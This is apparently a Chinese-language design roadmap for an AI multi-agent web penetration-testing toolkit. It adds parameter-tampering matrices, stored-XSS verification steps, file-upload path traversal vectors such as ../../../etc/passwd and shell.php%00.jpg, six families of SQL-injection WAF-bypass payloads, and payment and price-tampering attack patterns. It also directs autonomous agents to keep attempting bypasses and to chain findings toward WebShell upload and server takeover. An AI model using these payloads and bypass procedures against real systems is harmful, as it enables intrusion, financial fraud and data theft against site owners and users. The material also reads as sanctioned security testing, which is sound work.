## 2. 支柱 A · 漏测回收

### 2.1 F1: use_points 参数变体精化（治 M1，回收 180 分）

**问题回顾**：txn-agent 测试 create-batch-order.php 时，use_points 负数被拒后未继续测试精度溢出和参数名变体。v7.1 §5 的参数穷举清单提到了"use_points"但模型未执行。根因是清单不够具体——没有给出参数名变体和 payload 值。

**方案**：在核心技能文件 §7 的"交易端点参数穷举"表中，将"积分/优惠券"行扩展为具体 payload 清单：

```markdown
### 积分/优惠券/折扣参数穷举（v7.2 精化）

对每个交易端点，积分和优惠相关参数必须按以下矩阵逐一测试：

| 参数名变体 | 测试值 | 预期异常行为 |
|---|---|---|
| use_points / use_point / points / integral / score | -1, -100, 0.1, 0.01, 99999999, 1e10, "100"（字符串） | 负积分抵扣、精度溢出、超大值通过 |
| coupon_id / coupon_code / discount_code / voucher | 不存在ID, 已使用ID, 他人ID, 过期ID, 空字符串 | 使用他人/过期优惠券 |
| discount / discount_amount / discount_rate | -10, -0.5, 200, 0, 1.01 | 负折扣（反而加钱）、超100%折扣 |
| pay_amount / final_amount / total_amount | 0, 0.01, -1, 手动指定（与 order_amount 不一致） | 客户端指定支付金额 |

**约束：每个交易端点至少测试上述 2 个参数名变体 × 3 个测试值。** 如果只测了 use_points
而未测 points/integral/score，阴性结论标 shallow_negative。
```

**WooYun 蒸馏依据**：WooYun `logic-flaws.md` 中记录了价格篡改的具体参数模式——`price=0.01`、`amount` 精度溢出、参数污染（`price[]=299.00&price[]=0.01`）、类型混淆（`{"price": "0.01"}` 字符串注入、`{"price": 1e-10}` 科学记数法）。这些模式已在 WooYun 的 1,056 个支付篡改案例中反复出现。

### 2.2 F3: 存储型漏洞闭环验证（治 M3，回收 180 分）

**问题回顾**：input-agent 测试 submit-audit.php 的 XSS 时，POST 返回空响应后未深入验证数据是否被存储和渲染。V19（审核描述 XSS）实际存在。

**方案**：在核心技能文件 §6（覆盖完整性）新增存储型漏洞闭环验证规则：

```markdown
### 存储型漏洞闭环验证（v7.2 新增）

对任何接受文本输入并可能持久化的端点（提交审核、创建商品、修改资料、发布评论），
POST 后必须执行闭环验证：

| 步骤 | 操作 | 判定标准 |
|---|---|---|
| 1. 注入 | POST 含 XSS/注入 payload 的数据 | 记录 POST 响应（即使为空/200） |
| 2. 读取 | GET 对应资源的展示页面（列表/详情/后台） | 检查 payload 是否出现在响应中 |
| 3. 渲染验证 | 检查 payload 是否被原样渲染（未编码） | `<script>` 或 `onerror=` 原样出现 → confirmed |
| 4. 跨用户验证 | 用另一个身份 GET 该资源 | 跨用户可见 → 存储型 XSS（严重度升级） |

**关键端点清单（必须闭环验证）**：
- 提交审核（submit-audit, audit-description, review-text）
- 商品描述（product-name, product-description, category-name）
- 用户资料（nickname, bio, address, signature）
- 评论/反馈（comment, feedback, message, reason）
- 工单/申诉（ticket-description, appeal-reason）

**约束：POST 返回空/200 不等于安全。** 必须执行步骤 2-4 才能下阴性结论。
如果步骤 2 无法找到展示页面 → 标 blocked + "stored_but_unverified"。
```

**WooYun 蒸馏依据**：WooYun `xss.md` 的三层分析模型（输入源 → 数据流 → 渲染上下文）明确指出存储型 XSS 需要验证"数据库存储 → 页面渲染"的完整链路。7,532 个 XSS 案例中约 40% 是存储型，均需要 POST 后 GET 验证。

### 2.3 F2: 文件上传全参数枚举（治 M4，回收 200 分）

**问题回顾**：input-agent 成功上传了 .phtml 和双扩展文件，但未测 upload 接口的 category 参数路径穿越。V21（上传路径穿越）实际存在。

**方案**：在核心技能文件 §7（决策树）的"文件上传分支"新增全参数枚举规则：

```markdown
### 文件上传全参数枚举（v7.2 新增）

文件上传接口的测试不能只关注文件本身（filename/content-type/content）。
必须对上传接口的所有非文件参数逐一测试路径穿越和注入：

| 参数类型 | 典型参数名 | 测试向量 | 预期异常 |
|---|---|---|---|
| 分类/目录 | category, dir, folder, module, type | ../../../etc, ..\..\..\windows, %2e%2e%2f, ....// | 文件被存储到预期目录外 |
| 文件名 | filename, name, newname, save_name | ../../../tmp/shell, shell.php%00.jpg, shell.phtml | 路径穿越或扩展名绕过 |
| 大小/限制 | max_size, size_limit, width, height | 0, -1, 99999999, 超大值 | 绕过大小限制 |
| 回调/URL | callback, return_url, redirect | 外部URL, javascript:, data: | SSRF 或重定向 |
| 元数据 | title, description, alt, tag | XSS payload | 元数据被原样渲染 |

**约束：upload 接口至少测试 3 个非文件参数。** 如果只测了 file/filename 而未测
category/dir/module，阴性结论标 shallow_negative。

**WooYun 高频路径穿越向量（来自 50 个文件穿越案例）**：
- `../../../etc/passwd`（出现频率最高）
- `%2e%2e%2f`（URL 编码）
- `%252e%252e%252f`（双重 URL 编码）
- `....//`（双点+双斜杠）
- `..%5c`（Windows 反斜杠）
- `%c0%ae%c0%ae/`（UTF-8 过度编码，GlassFish 特定）
```

**WooYun 蒸馏依据**：WooYun `file-traversal.md` 的 50 个案例统计了文件穿越的高频参数（filename 63次、filepath 30次、path 20次）和编码绕过技术。`file-upload.md` 记录了编辑器漏洞路径（FCKEditor、UEditor）和 Content-Type 绕过表（`application/octet-stream → image/jpeg` 95% 绕过率）。

## 3. 支柱 B · WAF 对抗知识蒸馏

### 3.1 问题回顾

v7.1 评估中 M2（V18 商品删除 SQLi）的失败原因是"所有注入向量被'检测到非法关键字'拦截"。v7.1 方案明确说"不做 WAF 对抗指导"，但 v7.1 评估 §6.1 靶场 vs 实战差异分析指出"SRC 实战几乎必有 WAF/IDS"。WAF 绕过是技能包的下一个天花板。

### 3.2 WooYun WAF 绕过知识图谱

从 WooYun `knowledge/sql-injection.md`（56KB）和 `knowledge/xss.md`（7.5KB）中蒸馏的 WAF 绕过技术，按绕过原理分为 6 个家族：

**家族 1：大小写混淆**
```
uNiOn sElEcT
AnD oRdEr bY
```
适用：基于正则 `union select` 全小写匹配的 WAF。

**家族 2：注释穿插**
```
/*!50000union*/ /*!50000select*/ 1,2,3
union--!/*!select*/
/**/union/**/select/**/
```
适用：MySQL 版本注释（`/*!50000*/` 在 MySQL 5.0+ 中被执行）、内联注释分割关键字。

**家族 3：空白字符替换**
```
UNION%09SELECT    （Tab 替换空格）
UNION%0aSELECT    （换行替换空格）
UNION%0bSELECT    （垂直 Tab）
UNION%0cSELECT    （换页符）
```
适用：仅过滤 `空格分隔关键字` 的 WAF。

**家族 4：编码绕过**
```
URL 编码：      union%20select
双重 URL 编码：  %2520union%2520select
Unicode 编码：   \u0075nion \u0073elect
Hex 编码：       0x756e696f6e （"union" 的 hex）
```
适用：未做递归解码的 WAF。

**家族 5：函数/语法等价替换**
```
# substr → mid → left+right
SUBSTR(database(),1,1)  →  MID(database(),1,1)  →  LEFT(database(),1)

# concat → concat_ws → group_concat
concat(0x7e,database())  →  concat_ws(0x7e,database())

# sleep → benchmark → heavy query
IF(1=1,sleep(5),0)  →  IF(1=1,benchmark(10000000,sha1('a')),0)

# information_schema → sys → mysql.innodb_table_stats
SELECT table_name FROM information_schema.tables
→ SELECT object_name FROM mysql.innodb_table_stats
```
适用：黑名单过滤特定函数名的 WAF。

**家族 6：请求方式绕过**
```
# 参数污染（HPP）
?id=1 union select 1,2,3  （被拦截）
?id=1&id=union select 1,2,3  （后端可能取第二个值）

# 分块传输
Transfer-Encoding: chunked
7\r\nunion \r\n6\r\nselect\r\n0\r\n

# Content-Type 切换
application/x-www-form-urlencoded → multipart/form-data
（某些 WAF 不解析 multipart body）

# JSON 嵌套
{"id": "1 union select 1,2,3"}
{"id": {"$gt": "1 union select"}}
```
适用：仅检查 GET 参数或特定 Content-Type 的 WAF。

### 3.4 核心技能文件新增 WAF 对抗节

在核心技能文件 §7（决策树）新增独立节：

```markdown
### WAF 对抗协议（v7.2 新增）

当注入 payload 被拦截（响应包含"检测到非法关键字"/"请求被拦截"/403/blocked 等）时，
不得直接判 not_vulnerable。必须按以下决策树执行 WAF 绕过尝试：

**第一步：判断拦截类型**
- 响应 body 包含"关键字"/"keyword"/"illegal" → 关键字匹配型
- 响应 403 但 body 无特定信息 → 可能是 IP/频率限制型
- 响应 body 被截断或部分替换 → 正则替换型
- 响应正常但 payload 被去除 → 净化型

**第二步：按拦截类型选择绕过家族**

| 拦截类型 | 优先尝试的绕过家族 | 预期通过率 |
|---|---|---|
| 关键字匹配型 | 大小写混淆 → 注释穿插 → 空白替换 | 60-70% |
| 正则替换型 | 编码绕过 → 函数等价替换 | 40-50% |
| 净化型 | 双重编码 → 分块传输 → 参数污染 | 30-40% |
| 不确定 | 全部 6 个家族逐一尝试 | — |

**第三步：绕过成功的判定**
- payload 未被拦截且返回了正常响应格式 → 绕过成功
- 在此基础上验证注入是否生效（与无 WAF 场景的注入验证相同）
- 绕过成功 → 记录绕过方式作为 PoC 的一部分

**约束：至少尝试 3 个不同绕过家族。** 如果 3 个家族全部失败 → 标
not_vulnerable + waf_bypass_exhausted + 记录已尝试的家族和 payload。
```

## 4. 支柱 C · 链式利用 + 业务逻辑模式蒸馏

### 4.1 问题回顾

### 4.2 WooYun 链式利用模式蒸馏

从 WooYun `knowledge/logic-flaws.md`（8,292 个案例）和 `knowledge/command-execution.md` 中蒸馏出 4 种高频链式利用模式：

**模式 1：弱组件 → 认证绕过链**
```
验证码不消耗 → 暴力破解 SMS 码 → 用破解的码完成注册/重置
   ↓
任意用户注册/密码重置
```
WooYun 案例：某平台验证码固定 4 位 + 不消耗 → 30 秒内暴力破解 → 任意用户密码重置。

**模式 2：信息泄露 → 权限提升链**
```
配置文件泄露(AK/SK/密钥) → 伪造签名/token → 管理员操作
   ↓
管理后台接管/数据窃取
```
WooYun 案例：`config.js` 泄露 API Key → 构造合法签名 → 调用管理 API。

**模式 3：低危注入 → RCE 链**
```
SQLi 读取用户表 → 获取管理员 hash → 碰撞/彩虹表 → 后台登录
   ↓
后台文件上传 → WebShell → 服务器接管
```
WooYun 案例：搜索框 SQLi → `admin` 密码 MD5 → MD5 碰撞 → 后台 → 上传 WebShell。

**模式 4：业务逻辑 → 资金链**
```
竞态条件 → 积分重复兑换 → 积分提现
优惠券重复使用 → 多次抵扣 → 退款（退全款但只用了部分优惠）
价格篡改(0.01) → 下单 → 支付(0.01) → 退款(原价)
```
WooYun 案例：竞态条件的 critical-rate 高达 88%，是 WooYun 中严重率最高的漏洞类型（777 个案例）。

### 4.5 WooYun 业务逻辑攻击模式蒸馏

从 WooYun `knowledge/logic-flaws.md` 中蒸馏 6 种高频业务逻辑攻击模式，写入核心技能文件 §7：

```markdown
### 业务逻辑攻击模式库（v7.2 新增 · 蒸馏自 WooYun 8,292 案例）

#### 模式 1：竞态条件（Critical-rate 88%，777 案例）
对积分兑换、优惠券使用、库存扣减、余额转账等"检查-执行"操作，
发送 10-100 个并发请求，观察是否存在 TOCTOU 窗口：
- 积分余额只检查一次但执行多次扣减
- 优惠券状态检查和标记使用之间存在时间差
- 库存扣减和订单确认非原子操作

测试方法：使用多线程/asyncio 同时发送 N 个相同请求，对比执行结果数 vs 扣减次数。

#### 模式 2：支付回调伪造（Critical-rate 74.2%，1,227 案例）
对支付回调端点（notify/callback/webhook），测试：
- 回调签名是否可伪造（弱签名算法/密钥泄露/无签名）
- 回调参数是否可篡改（trade_status/out_trade_no/total_amount）
- 回调是否验证来源 IP（仅允许支付平台 IP 段）
- 回调是否做幂等处理（同一通知多次处理）

#### 模式 3：价格/金额篡改（Critical-rate 83%，176 案例）
对下单/支付/退款端点，测试：
- 客户端提交 price/amount 是否被服务端覆盖
- 参数污染：`price=299&price=0.01`（后端取哪个值）
- 类型混淆：`{"price": "0.01"}` 字符串 vs 数字
- 科学记数法：`{"price": 1e-10}`
- NULL 注入：`{"price": null}`
- 精度溢出：`{"price": 0.001}` vs 服务端最小单位 0.01

#### 模式 4：密码重置流程绕过（来自 logic-flaws.md 4 种模式）
- Pattern A（验证码回显）：发送验证码后响应 body 是否泄露验证码值
- Pattern B（验证码不绑用户）：用自己的手机收验证码，用于重置他人密码
- Pattern C（步骤跳过）：直接访问重置第 3 步页面，跳过第 2 步验证
- Pattern D（可控凭证参数）：重置请求中是否可指定 username/user_id

#### 模式 5：优惠券/积分滥用
- 优惠券叠加：同一订单使用多张互斥优惠券
- 优惠券退款：使用优惠券后退款，退款金额按原价计算
- 积分竞态：并发兑换同一积分池
- 积分精度：使用 0.1 个积分（如果积分最小单位是 1）

#### 模式 6：响应篡改绕过前端校验
- 拦截验证码错误响应 `{"status":"0","msg":"验证码错误"}`
- 修改为 `{"status":"1","msg":"成功"}`
- 观察前端是否进入下一步（前端信任了响应状态但未重新验证）
- 后端是否在下一步重新验证了前置条件
```

# 路线图：v7.3/v7.4 · HackerOne 参数模式挖掘

> 一句话结论：v7.2 用 WooYun 蒸馏解决了"知道怎么测"的问题，v7.3/v7.4 用 HackerOne 12,618 份报告解决"测什么参数"的问题——通过数据驱动的参数模式挖掘，系统性地消除"测了主参数但漏了次参数"的根因。

## 10. v7.3 目标与范围

### 10.1 核心目标

从 HackerOne `hackerone_disclosed_reports` 数据集（12,618 份报告，Parquet 格式）中挖掘：

1. **高频参数名模式**：按漏洞类型聚类，生成每类漏洞的参数名清单 → 注入知识卡 `match.params`
2. **端点命名模式**：按漏洞类型聚类，生成高危端点路径模式 → 注入知识卡 `match.endpoints`
3. **payload 变体模式**：从 PoC 文本中提取同类漏洞的 payload 变体 → 注入核心技能文件参数穷举表

### 10.2 为什么需要数据驱动

v7.1 和 v7.2 的参数清单都是手工编写的——来自评估报告的漏测归因和 WooYun 案例。手工清单有两个问题：

1. **覆盖偏差**：只能覆盖已知的参数名模式，无法发现"不知道自己不知道"的参数
2. **更新滞后**：新出现的参数命名习惯（如 GraphQL 的 `variables`、REST 的 `_expand`）不会自动进入清单

HackerOne 数据集的优势在于它包含了全球数千个项目的真实漏洞报告，参数名和端点路径的统计分布能反映真实的 SRC 测试场景。

### 10.3 v7.3 不做的事

| 不做的事 | 原因 |
|---|---|
| 不微调/训练模型 | 目标是知识卡精化，不是模型训练 |
| 不处理 `visibility: "no-content"` 的报告 | 内容被编辑，无法提取有效信息 |
| 不做 NLP 语义分析 | 第一版用统计方法（正则 + 聚类），够用 |

```python
import re

# 从 vulnerability_information 中提取 HTTP 参数名
PARAM_PATTERNS = [
    r'(?:[\?&])(\w+)=',           # URL 查询参数: ?param=
    r'"(\w+)"\s*:',               # JSON key: "param":
    r"'(\w+)'\s*=>",              # PHP array: 'param' =>
    r'(\w+)\s*=\s*[^=]',          # Form data: param=
    r'name="(\w+)"',              # HTML form: name="param"
    r'param(?:eter)?[=:]?\s*(\w+)', # 文本描述: parameter: xxx
]

ENDPOINT_PATTERNS = [
    r'(?:GET|POST|PUT|DELETE|PATCH)\s+(/[^\s\?]+)',  # HTTP method + path
    r'/(?:api|v\d+)/[^\s\?"]+',                       # REST API path
    r'\.php\b',                                         # PHP endpoint
    r'\.(?:jsp|asp|aspx)\b',                           # Other server-side
]
```

**步骤 3：按漏洞类型聚类**

```python
from collections import defaultdict, Counter

# 按 weakness.name 聚类

endpoints_by_vuln = defaultdict(list)

for report in filtered:
```

## 12. v7.4 扩展方向（v7.3 验证后决定）

### 12.1 候选方向 A：Payload 变体挖掘

从 `vulnerability_information` 中提取具体的 payload 字符串，按漏洞类型分类，生成 payload 变体清单。这比手工编写 payload 矩阵更全面，但需要更复杂的 NLP 处理（从自由文本中区分 payload 和正常文本）。

### 12.3 候选方向 C：攻击链模式挖掘

分析同一 `team.handle`（目标项目）下的多份报告，寻找"同一项目中经常同时出现的漏洞类型组合"。这些组合可能暗示常见的攻击链模式（如"SSRF + 元数据泄露 + 云凭证窃取"经常同时出现）。

# 路线图：v8 · Cairn 式 Fact-Intent 架构升级

> 一句话结论：v7.x 系列在现有 4-agent + 覆盖台账架构上做到了极限（4060/4800），但覆盖台账是被动记录"测过了什么"，"还应该测什么"完全依赖模型判断。v8 借鉴 Cairn 的 Blackboard + Fact-Intent Graph 架构，引入显式的 Intent 生成和调度机制，让系统能自动从已有发现中推导下一步方向，将技能包贡献度从 36% 推向 50%。

## 13. v8 核心概念

### 13.1 Cairn 架构要点回顾

Cairn（github.com/oritera/Cairn，~1,890 stars）是一个 AI 驱动的通用状态空间搜索引擎，在腾讯云黑客松 610 队中拿到 AK（全通）。其核心架构：

| 概念 | Cairn 定义 | Atoolkit 现有对应 | v8 升级方向 |
|---|---|---|---|
| **Blackboard** | 共享知识存储，所有 agent 通过它协调 | 覆盖台账 + coverage_ledger.md | 升级为 Fact-Intent Graph |
| **Fact** | 已确认的发现（验证过的知识） | confirmed findings + not_vulnerable 结论 | 保持，增加结构化元数据 |
| **Intent** | 声明的探索方向（未知的步骤） | 无——完全依赖模型判断 | **新增**，从 Fact 动态生成 |
| **Hint** | 人类提供的判断引导 | authz.md + hint.md | 保持 |
| **Stigmergy** | agent 通过 Blackboard 间接协调 | 4 agent 并行 + 聚合阶段 | 增强——Intent 驱动的动态调度 |
| **OODA Loop** | 每个 agent 的 Observe-Orient-Decide-Act 循环 | surface 测试循环 | 形式化——显式 OODA 步骤 |

### 13.2 为什么需要 Fact-Intent Graph

当前 Atoolkit 的覆盖台账是一张表：

```
| surface | endpoint | param | status | agent |
| S01 | /register | captcha | confirmed | auth |
| S02 | /login | password | not_vulnerable | auth |
| S03 | /refund | amount | not_tested | — |
```

它记录了"测过了什么"（Fact），但"还应该测什么"（Intent）完全靠模型自己从这张表中推理。这导致两个问题：

1. **Intent 丢失**：auth-agent 发现"验证码不消耗"后，应该生成 Intent"检查 SMS 码是否可暴力破解"，但这个 Intent 只存在于 agent 的推理过程中，不会出现在覆盖台账里
2. **Intent 冲突**：txn-agent 和 idor-agent 可能对同一个端点有不同的 Intent（txn 想测金额篡改，idor 想测越权），但没有机制协调

Fact-Intent Graph 的解决方案：

```
Fact: "captcha 不消耗" (auth-agent, S01)
  → Intent: "检查 SMS 码速率限制" (priority: high, assigned: auth-agent)
  → Intent: "验证 SMS 码是否可跨用户重用" (priority: high, assigned: auth-agent)

Fact: "submit-audit.php 可修改审核状态" (auth-agent, S08)
  → Intent: "测试 submit-audit.php 的 description 参数 XSS" (priority: medium, assigned: input-agent)
  → Intent: "测试 submit-audit.php 的 merchant_id 参数 IDOR" (priority: medium, assigned: idor-agent)
```

每个 Fact 自动生成 1-3 个 follow-up Intent，Intent 被调度给合适的 agent。这样：
- 链式利用不再是"可选的深度思考"，而是"系统自动生成的必做步骤"
- 跨 agent 缝隙不再是"聚合阶段才发现"，而是"实时通过 Intent 协调"

## 14. v8 架构设计

### 14.1 Fact-Intent Graph 数据结构

```python
# engine/graph.py (新增)

class Fact:
    id: str                    # fact_001
    surface_id: str            # S01
    finding_type: str          # confirmed / not_vulnerable / blocked
    vuln_class: str            # SQLi / IDOR / auth-bypass / ...
    endpoint: str              # /api/user/register.php
    params: list[str]          # ["captcha", "sms_code"]
    agent: str                 # auth / txn / idor / input
    timestamp: str             # ISO-8601
    evidence: list[str]        # 证据文件路径
    chain_assessment: dict     # v7.2 引入的链式评估结果

class Intent:
    id: str                    # intent_001
    source_fact_id: str        # fact_001 (从哪个 Fact 生成)
    description: str           # "检查 SMS 码速率限制"
    target_vuln_class: str     # auth-bypass
    target_endpoint: str       # /api/user/send-sms.php (可能为 None = 未知)
    target_params: list[str]   # ["sms_code"] (可能为空)
    priority: str              # high / medium / low
    assigned_agent: str        # auth / txn / idor / input / any
    status: str                # pending / in_progress / completed / abandoned
    created_at: str            # ISO-8601

class FactIntentGraph:
    facts: list[Fact]
    intents: list[Intent]
    
    def add_fact(self, fact: Fact) -> list[Intent]:
        """添加 Fact，自动生成 follow-up Intent"""
        self.facts.append(fact)
        new_intents = self._generate_intents(fact)
        self.intents.extend(new_intents)
        return new_intents
    
    def _generate_intents(self, fact: Fact) -> list[Intent]:
        """从 Fact 生成 follow-up Intent（规则引擎）"""
        intents = []
        # 规则 1: 认证组件弱点 → 链式利用 Intent
        if fact.vuln_class == "auth-bypass" and fact.finding_type == "confirmed":
            intents.append(Intent(
                description=f"链式验证: {fact.params} 弱点的端到端影响",
                priority="high",
                assigned_agent=fact.agent
            ))
        # 规则 2: 跨功能端点 → 其他方向的 Intent
        if len(fact.params) > 1:
            for param in fact.params:
                intents.append(Intent(
                    description=f"交叉测试: {fact.endpoint} 的 {param} 参数",
                    priority="medium",
                    assigned_agent="any"
                ))
        # 规则 3: 信息泄露 → 提权 Intent
        if fact.vuln_class == "info-disclosure" and fact.finding_type == "confirmed":
            intents.append(Intent(
                description=f"利用泄露信息尝试提权",
                priority="high",
                assigned_agent="any"
            ))
        return intents
    
    def get_pending_intents(self, agent: str) -> list[Intent]:
        """获取指定 agent 的待处理 Intent"""
        return [i for i in self.intents 
                if i.status == "pending" and 
                (i.assigned_agent == agent or i.assigned_agent == "any")]
```

### 14.2 Intent 生成规则引擎

Intent 生成是 v8 的核心创新点。以下规则从 Cairn 的 OODA 循环和 WooYun 的攻击链模式中蒸馏：

| 触发条件（Fact 类型） | 生成的 Intent | 优先级 | 目标 Agent |
|---|---|---|---|
| 认证组件 confirmed | 链式验证：端到端影响 | high | 原 agent |
| 信息泄露 confirmed | 利用泄露信息尝试提权 | high | any |
| SQLi confirmed | 读取敏感表（用户/密钥）→ 伪造凭证 | high | any |
| 端点有多个参数类型 | 交叉测试：每种参数类型独立验证 | medium | 对应方向 agent |
| 端点同时涉及状态参数和文本参数 | 缝隙检查：确保两种参数都有测试 | medium | 聚合 agent |
| not_vulnerable + WAF 拦截证据 | WAF 绕过尝试 | medium | input agent |
| confirmed + chain_assessment.feasible | 执行链式利用验证 | high | any |
| 所有 surface 测完但覆盖率 < 90% | 补测：未覆盖的攻击面 | low | any |

### 14.3 修改后的 Orchestrator 流程

```python
# engine/orchestrator.py (修改)

# 现有流程：
# Phase 0 → 4 agent 并行测试 → 聚合 → 报告

# v8 流程：
# Phase 0 → 4 agent 并行测试 → Intent 驱动补测 → 聚合 → 报告

def run_session():
    graph = FactIntentGraph()
    
    # Phase 0: 侦察（不变）
    surfaces = phase0_recon()
    
    # Phase 1: 并行测试（修改：每个 surface 测试后将结果写入 Graph）
    for surface in surfaces:
        fact = test_surface(surface)
        new_intents = graph.add_fact(fact)
        log(f"Fact: {fact.id} → {len(new_intents)} new Intents")
    
    # Phase 2: Intent 驱动补测（新增）
    pending = graph.get_pending_intents("any")
    while pending:
        intent = pending.pop(0)
        intent.status = "in_progress"
        result = execute_intent(intent)
        if result:
            fact = Fact.from_intent_result(intent, result)
            new_intents = graph.add_fact(fact)
            pending.extend(new_intents)
        intent.status = "completed"
    
    # Phase 3: 聚合（不变 + Intent 统计）
    findings = aggregate(graph)
    generate_report(findings, graph.stats())
```
